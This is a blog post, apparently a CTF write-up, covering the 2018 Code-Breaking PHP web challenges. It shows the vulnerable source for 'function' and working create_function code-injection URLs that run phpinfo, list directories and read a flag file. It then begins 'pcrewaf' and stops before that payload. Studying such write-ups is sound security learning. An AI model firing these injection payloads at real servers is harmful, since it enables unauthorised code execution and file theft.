---
title: 2018 Code-Breaking WriteUp
tags:
  - CTF
  - WEB
  - WriteUp
date: 2018-12-12 14:42:59
toc: true
---

## 前言
感谢P牛精心准备的题目，前段时间各种事情，最近才有空来做这套题目，学到了不少东西，在此记录。
<!-- more -->
几个题目知识点的描述：
1. function PHP函数利用技巧
2. pcrewaf PHP正则特性
3. phpmagic PHP写文件技巧
4. phplimit PHP代码执行限制绕过
5. nodechr Javascript字符串特性
6. javacon SPEL表达式沙盒绕过
7. lumenserial 反序列化在7.2下的利用
8. picklecode Python反序列化沙盒绕过

<!-- more -->

## easy - function
```
等级：easy
一个非常简单地PHP题目
所有代码都在题目中。
puzzle url: http://51.158.75.42:8087/
```
环境：
```http
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.12
```
源码：
```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```
$action必须出现`[a-z0-9_]`之外的字符才能进到后面去动态调用函数，尝试在函数名前后fuzz一下字符
![](/img/2018-code-breaking-1.png)
发现函数名前面存在`%5c`也就是`\`，依然能够顺利调用，因为`\`是php里的默认命名空间，具体原理可以看P牛的小密圈  
后面就是找一个危险函数去动态调用并命令执行，最后找到的是`create_function`  
payload如下：
```url
phpinfo:
http://51.158.75.42:8087/?action=\create_function&arg=return 1;}phpinfo();/*
列目录：
http://51.158.75.42:8087/?action=\create_function&arg=return 1;}var_dump(scandir('../'));/*
读flag：
http://51.158.75.42:8087/?action=\create_function&arg=1;}var_dump(readfile('../flag_h0w2execute_arb1trary_c0de'));/*

```

## easy - pcrewaf
```
等级：easy
谁说基于正则的WAF无法防御黑客呢？
所有代码都在URL里。
URL： http://51.158.75.42:8088/
```
环境：
```http
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.24
```
源码：
```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 1
```
可以上传文件，但是文件内容使用正则检查是否为php，如果匹配成功则不写入文件。看提示就是需要绕过这处正则了
payload如下：
